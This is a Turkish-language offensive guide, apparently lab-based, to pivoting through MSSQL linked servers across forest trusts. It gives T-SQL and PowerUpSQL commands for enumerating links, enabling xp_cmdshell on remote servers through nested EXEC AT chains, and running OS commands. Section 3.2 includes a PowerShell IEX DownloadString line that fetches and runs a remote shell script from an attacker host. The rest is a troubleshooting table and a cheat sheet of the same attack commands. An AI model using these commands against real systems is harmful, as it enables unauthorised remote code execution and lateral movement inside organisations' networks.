## 1. Genel Bakış ve Mimari

Kurumsal işletmelerde veritabanları nadiren izole çalışır; raporlama, iş zekası (BI), muhasebe ve ERP entegrasyonları için **MSSQL Veritabanı Bağlantıları (Database Links)** kullanılır. `sp_addlinkedserver` yordamıyla kurulan bu bağlantılar, bir SQL sunucusunun diğer etki alanlarında veya harici ormanlarda (Forest Trusts) bulunan uzak veritabanı sunucularına doğrudan sorgu göndermesine izin verir.

Saldırganlar açısından Database Link'leri son derece ölümcül kılan faktör **Kimlik Taklidi ve Güvenlik Bağlamı (Security Context Mapping)** mimarisidir:
Çoğu sistem yöneticisi bağlantıyı kurarken "Be made using this security context" seçeneğini işaretleyerek uzak sunucu üzerindeki **`sa` (sysadmin)** hesabını sabitler. Bu durum, yerel sunucuda en düşük yetkili bir kullanıcının bile link üzerinden atlayarak uzak ormandaki sunucuda `sysadmin` yetkisine ulaşmasına olanak tanır.

```
┌──────────────────────────────────────┐          ┌──────────────────────────────────────┐
│       ORMAN A: dollarcorp.local      │          │        ORMAN B: eurocorp.local       │
│                                      │          │                                      │
│   [ Saldırgan ]                      │          │                                      │
│        │ (1) Düşük yetkili login     │          │                                      │
│        ▼                             │          │                                      │
│   ┌───────────────┐                  │          │   ┌───────────────┐                  │
│   │  DCORP-MSSQL  │ ──── (2) Link ────────────────► │   EU-SQL01    │ ── (4) Link ───┐ │
│   └───────────────┘   (sa mapping)   │          │   └───────┬───────┘  (sa mapping)  │ │
│                                      │          │           │                        │ │
│                                      │          │           ▼                        ▼ │
│                                      │          │      (3) xp_cmdshell        ┌──────────────┐
│                                      │          │       Reverse Shell         │   EU-DC01    │
│                                      │          │       eurocorp\svc_sql      └──────────────┘
└──────────────────────────────────────┘          └──────────────────────────────────────┘
```

### Bağlantı Güvenlik Modelleri:
1. **Current Security Context (Kerberos/Windows Auth):** İstemcinin Kerberos bileti uzak sunucuya aktarılır (Çift sıçrama - Double Hop sorunu oluşabilir).
2. **Fixed Login Mapping (Güvenlik Açığı):** Gelen her yerel kullanıcı, uzak sunucuda tanımlanmış statik bir SQL kullanıcısına (çoğunlukla `sa`) eşlenir.
3. **RPC Out Özelliği:** Uzak sunucuda saklı yordam (Stored Procedure) çalıştırmak için `rpc out` parametresinin `true` olması gerekir.

## 2. Database Link Keşfi ve Haritalama (Link Crawling)

Etki alanında ele geçirilen bir hesapla MSSQL sunucusuna bağlanıp mevcut dış bağlantılar taranır.

### 2.1. Manuel T-SQL ile Bağlantılı Sunucuları Listeleme

```sql
-- 1. Mevcut bağlantılı sunucuları ve erişim modlarını listeleme
SELECT server_id, name, product, provider, data_source, is_linked FROM master..sysservers;

-- 2. sp_linkedservers yordamı ile sorgulama
EXEC sp_linkedservers;

-- 3. Geçerli bağlantı üzerindeki yetkilerimizi ve sysadmin olup olmadığımızı doğrulama
SELECT SYSTEM_USER, USER_NAME(), IS_SRVROLEMEMBER('sysadmin');
```

### 2.2. PowerUpSQL ile Otomatik Link Tarama (Link Crawling)

PowerUpSQL kütüphanesinin `Get-SQLServerLinkCrawl` cmdlet'i, bağlantı zincirini özyinelemeli (recursive) olarak dolaşır ve en uç noktaya kadar tüm link grafiğini haritalar:

```powershell
# 1. PowerUpSQL modülünü içe aktarma
Import-Module .\PowerUpSQL.ps1

# 2. Yerel veritabanından başlayarak tüm link zincirini tarama
Get-SQLServerLinkCrawl -Instance "dcorp-mssql.dollarcorp.local" -Verbose

# 3. Sonuçları analiz etme (Hangi link sysadmin hakkı veriyor?)
Get-SQLServerLinkCrawl -Instance "dcorp-mssql.dollarcorp.local" | Format-Table -AutoSize
```

## 3. Link Zinciri Üzerinden Kod Yürütme ve Pivotlama

Bağlantı zincirinde `sysadmin` yetkisine ulaşıldığında, uzaktaki sunucuda `xp_cmdshell` aktifleştirilerek komut satırı erişimi (RCE) sağlanır.

### 3.1. Tek Sıçramalı (Single Hop) `OPENQUERY` ve Komut Yürütme

Hedef bağlantı `EU-SQL01` sunucusuna işaret ediyorsa:

```sql
-- 1. Uzak sunucuda geçerli kullanıcıyı ve yetkileri kontrol etme
SELECT * FROM OPENQUERY("EU-SQL01", 'SELECT SYSTEM_USER, IS_SRVROLEMEMBER(''sysadmin'')');

-- 2. Uzak sunucuda xp_cmdshell'i aktif etme
EXEC ('sp_configure ''show advanced options'', 1; RECONFIGURE;') AT [EU-SQL01];
EXEC ('sp_configure ''xp_cmdshell'', 1; RECONFIGURE;') AT [EU-SQL01];

-- 3. Uzak sunucu üzerinde işletim sistemi komutu çalıştırma
EXEC ('xp_cmdshell ''whoami && ipconfig''') AT [EU-SQL01];
```

### 3.2. Çok Kademeli (Multi-Hop) Zincirleme Sıçrama

Eğer `EU-SQL01` sunucusu da orman içindeki başka bir sunucuya (`EU-SQL02` veya `EU-DC01`) bağlıysa iç içe `OPENQUERY` sorguları kullanılır:

```sql
-- 1. İki kademe ötedeki sunucunun versiyon ve kullanıcı bilgilerini çekme
SELECT * FROM OPENQUERY("EU-SQL01", 'SELECT * FROM OPENQUERY("EU-SQL02", ''SELECT SYSTEM_USER, @@servername'')');

-- 2. İkinci kademedeki sunucuda xp_cmdshell'i aktif etme
EXEC ('EXEC (''sp_configure ''''show advanced options'''', 1; RECONFIGURE;'') AT [EU-SQL02]') AT [EU-SQL01];
EXEC ('EXEC (''sp_configure ''''xp_cmdshell'''', 1; RECONFIGURE;'') AT [EU-SQL02]') AT [EU-SQL01];

-- 3. Hedef sunucudan saldırgan makinesine ters bağlantı (Reverse Shell) alma
EXEC ('EXEC (''xp_cmdshell ''''powershell -c "IEX(New-Object Net.WebClient).DownloadString(\"http://10.0.0.5/shell.ps1\")"'''' '') AT [EU-SQL02]') AT [EU-SQL01];
```

### 3.3. PowerUpSQL ile Otomatik RCE Tetikleme

```powershell
# Zincir üzerinden tek komutla doğrudan komut çalıştırma
Invoke-SQLOSCmd -Instance "dcorp-mssql.dollarcorp.local" -Query "whoami" -LinkServer "EU-SQL01"
```

## 4. Karşılaşılan Hatalar ve Çözümleri (Troubleshooting)

| Hata Mesajı | Olası Kök Neden | Çözüm Adımı |
|---|---|---|
| `Server '...' is not configured for DATA ACCESS` | Link tanımında `data access` özelliği kapatılmıştır. | Sysadmin yetkiniz varsa aktifleştirin: `EXEC sp_serveroption 'EU-SQL01', 'data access', 'true';` |
| `Server '...' is not configured for RPC OUT` | Uzak sunucuda doğrudan `EXEC (...) AT` çalıştırmak engellenmiştir. | Link parametresini açın: `EXEC sp_serveroption 'EU-SQL01', 'rpc out', 'true';` veya `OPENQUERY` kullanın. |
| `SQL Server blocked access to procedure 'xp_cmdshell'` | `xp_cmdshell` güvenlik ilkesi gereği kapalıdır. | Gelişmiş seçenekleri açıp yeniden yapılandırın: `sp_configure 'show advanced options', 1; RECONFIGURE; sp_configure 'xp_cmdshell', 1; RECONFIGURE;` |
| `Login failed for user 'NT AUTHORITY\ANONYMOUS LOGON'` | Kerberos Çift Sıçrama (Double-Hop) kısıtı devrededir; SPN eksiktir. | Sabit SQL Login (SQL Auth) haritalaması kullanın veya unconstrained delegation yapılandırın. |

## 6. En Çok Kullanılan Komutlar (Cheat Sheet)

```sql
-- 1. Mevcut bağlantılı sunucuları listele
EXEC sp_linkedservers;

-- 2. Uzak sunucuda kullanıcıyı ve sysadmin durumunu kontrol et
SELECT * FROM OPENQUERY("LINKED_SRV", 'SELECT SYSTEM_USER, IS_SRVROLEMEMBER(''sysadmin'')');

-- 3. RPC OUT özelliğini aktif et
EXEC sp_serveroption 'LINKED_SRV', 'rpc out', 'true';

-- 4. xp_cmdshell aktif et (Tek sıçrama)
EXEC ('sp_configure ''show advanced options'', 1; RECONFIGURE; sp_configure ''xp_cmdshell'', 1; RECONFIGURE;') AT [LINKED_SRV];

-- 5. Uzak sunucuda komut çalıştır
EXEC ('xp_cmdshell ''whoami /all''') AT [LINKED_SRV];

-- 6. Çoklu sıçramada (Multi-hop) komut yürüt
EXEC ('EXEC (''xp_cmdshell ''''whoami'''' '') AT [TARGET_SQL]') AT [PIVOT_SQL];
```
